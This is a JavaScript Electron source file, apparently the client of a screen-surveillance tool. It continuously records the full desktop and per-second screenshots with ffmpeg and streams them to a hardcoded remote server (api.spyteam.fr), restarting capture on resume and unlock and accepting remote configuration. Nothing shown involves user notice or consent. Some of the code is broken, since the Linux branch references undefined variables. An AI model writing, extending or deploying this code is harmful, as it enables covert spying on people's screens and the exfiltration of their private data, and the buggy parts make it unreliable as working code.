import express from "express";
import { spawn, exec } from "child_process";
import http from "http";
import { io as socketIo } from "socket.io-client";
import os from "os";
import { app, screen, powerMonitor } from "electron";


// 📦 Import du helper
import helperModule from "./helper/helper.js";
const helper = helperModule.default || helperModule;

const appli = express();
const server = http.createServer(appli);
let io;
const PORT = 9000;

const serveurBackend = "https://api.spyteam.fr";
//const serveurBackend = "http://192.168.1.177:4000";
let idClient = "67fcf6e4a28e6ec677fe2e58";

let fileName = helper.generateFileName(idClient);
let dateFolder = helper.generateDate();
let isConnected = true;
let resolution = "3840x2160"; // Valeur par défaut
let fpsVideo = "25"; // FPS par défaut
let qualiteVideo = "6000k";
let fpsImage = "fps=1/1"; // capture image par seconde
let qualiteImage = "10"; // Qualité par défaut
let timeoutCapture = "5000";
var ffmpeg = null
var ffmpegImg = null

// 📦 Appliquer une nouvelle configuration
function applyNewConfig(config) {
  if (config.fpsVideo) {
    fpsVideo = config.fpsVideo.toString();
    console.log("🆕 FPS mis à jour:", fpsVideo);
  }
  if (config.qualiteVideo) {
    qualiteVideo = config.qualiteVideo.toString();
    console.log("🆕 Qualité mise à jour:", qualiteVideo);
  }
  if (config.fpsImage) {
    fpsImage = config.fpsImage.toString();
    console.log("🆕 fpsImage mise à jour:", fpsImage);
  }
  if (config.qualiteImage) {
    qualiteImage = config.qualiteImage.toString();
    console.log("🆕 qualiteImage mise à jour:", qualiteImage);
  }
  if (config.timeout) {
    timeoutCapture = config.timeout.toString();
    console.log("🆕 timout:", timeoutCapture);
  }
}

// 📡 Connexion Socket.IO & écouteurs
io = socketIo(serveurBackend);

// connexion au socket du serveur
io.on("connect", () => {
  console.log("🟢 Connexion réussie au serveur Socket.IO !");
  restartCapture()
});

// Modification des configuration
io.on("config:update", (data) => {
  console.log("🛠️ Config mise à jour :", data);
  if (data.userId === idClient) {
    stopCapture();
    applyNewConfig(data.config);
    restartCapture();
  }
});

// 🎥 Démarrer la capture
function startCapture() {
  setTimeout(() => {
    const platform = os.platform();
    if (platform == "win32") {
       ffmpeg = spawn("ffmpeg", [
        "-f",
        "gdigrab",
        "-r",
        "20",
        "-draw_mouse",
        "1",
        "-offset_x",
        "0",
        "-offset_y",
        "0",
        "-i",
        "desktop",
        "-vcodec",
        "libx264",
        "-preset",
        "ultrafast",
        "-crf",
        "25",
        "-pix_fmt",
        "yuv420p",
        "-movflags",
        "frag_keyframe+empty_moov",
        "-vf",
        `scale=${resolution}`,
        "-f",
        "mp4",
        "pipe:1",
      ]);

      ffmpegImg = spawn("ffmpeg", [
        "-f",
        "gdigrab",
        "-framerate",
        "1",
        "-i",
        "desktop",
        "-vf",
        `fps=1/1,scale=1100:620`,
        "-vcodec",
        "libwebp",
        "-lossless",
        "0",
        "-q:v",
        "30", // plus proche 0 plus la qualité est bonne
        "-f",
        "image2pipe",
        "pipe:1",
      ]);
    }

    if (platform == "linux") {
      ffmpeg = spawn("ffmpeg", [
        "-f",
        "x11grab",
        "-r",
        fps,
        "-s",
        resolution,
        "-i",
        ":0.0",
        "-q:v",
        qualite,
        "-c:v",
        "libx264",
        "-preset",
        "veryfast",
        "-crf",
        "23",
        "-pix_fmt",
        "yuv420p",
        "-movflags",
        "frag_keyframe+empty_moov",
        "-f",
        "mp4",
        "pipe:1",
      ]);

      ffmpegImg = spawn("ffmpeg", [
        "-f",
        "x11grab",
        "-video_size",
        resolution,
        "-i",
        ":0.0",
        "-vf",
        "fps=1/1",
        "-vcodec",
        "libwebp",
        "-lossless",
        "0",
        "-q:v",
        "10",
        "-f",
        "image2pipe",
        "pipe:1",
      ]);
    }

    ffmpegImg.stdout.on("data", (data) => {
      io.emit("test", { data: data, client: idClient });
    });

   var listBuffer = []
   ffmpeg.stdout.on("data", (data) => {
    listBuffer.push(data)
    });
   setInterval(()=>{
     if(listBuffer.length>5){
        console.log(listBuffer);
        io.emit("video", {arrayBuffer:listBuffer, client: idClient, fileName: fileName });
        listBuffer=[]
      }
   },5000)
  }, timeoutCapture); // Attendre 1 seconde avant de démarrer la capture
}

// 🛑 Stopper la capture
function stopCapture() {
  if (ffmpeg) {
    ffmpeg.kill("SIGTERM");
    ffmpeg = null;
  }
  if (ffmpegImg) {
    ffmpegImg.kill("SIGTERM");
    ffmpegImg = null;
  }
  ffmpeg=null
  ffmpegImg=null
}

// 🔁 Redémarrer la capture
function restartCapture() {
  stopCapture()
  fileName = helper.generateFileName(idClient);
  io.emit("sendVideo", {
    client: idClient,
    fileName: fileName,
    dateFolder: dateFolder,
  });
  startCapture();
}

// 💻 Application prête et calcule de la résolution de l'écran
app.whenReady().then(() => {
  function roundToEven(number) {
    return number % 2 === 0 ? number : number + 1;
  }

  const displays = screen.getAllDisplays();
  let totalWidth = 0,
    totalHeight = 0;

  displays.forEach((display) => {
    totalWidth += display.bounds.width;
    totalHeight = Math.max(totalHeight, display.bounds.height);
  });
  if (totalWidth > 3840) {
    if (totalWidth % 2 !== 0) {
      totalWidth = roundToEven(totalWidth);
    }

    if (totalHeight % 2 !== 0) {
      totalHeight = roundToEven(totalHeight);
    }
  }
  resolution = `${totalWidth}:${totalHeight}`;

// démarrage serveur
  server.listen(PORT, () => {
    console.log("serveur running on port " + PORT);
  });
});

// 🌐 Vérifier la connexion
function checkConnection() {
  exec("ping -c 1 google.com", (error) => {
    if (error) {
      if (isConnected) {
        isConnected = false;
      }
    } else {
      if (!isConnected) {
        isConnected = true;
        restartCapture();
      }
    }
  });
}

// ⚡️ windows intérronpu
powerMonitor.on("suspend", () => {
  stopCapture();
});

// ⚡️ windows après mise en veille
powerMonitor.on("resume", () => {
  restartCapture();
});

// ⚡️ windows après fermeture
powerMonitor.on("lock-screen", () => {
  stopCapture();
});

// ⚡️ windows après ouverture
powerMonitor.on("unlock-screen", () => {
  restartCapture();
});

// ⚡️ verification de connexion tous les 5 secondes
setInterval(checkConnection, 5000);
